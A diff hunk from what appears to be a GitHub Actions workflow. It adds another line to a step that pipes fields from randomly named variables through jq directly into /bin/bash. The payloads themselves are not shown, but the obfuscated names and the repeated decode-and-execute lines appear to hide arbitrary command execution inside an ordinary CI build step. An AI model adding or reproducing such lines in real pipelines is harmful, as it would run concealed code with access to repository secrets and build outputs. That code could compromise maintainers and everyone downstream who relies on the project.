@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$bam1685" | jq -r .ez82047 | /bin/bash
           printf '%s' "$szfa0" | jq -r .o8615 | /bin/bash
           printf '%s' "$l685" | jq -r .y27 | /bin/bash
+          printf '%s' "$ttgu01" | jq -r .w03 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
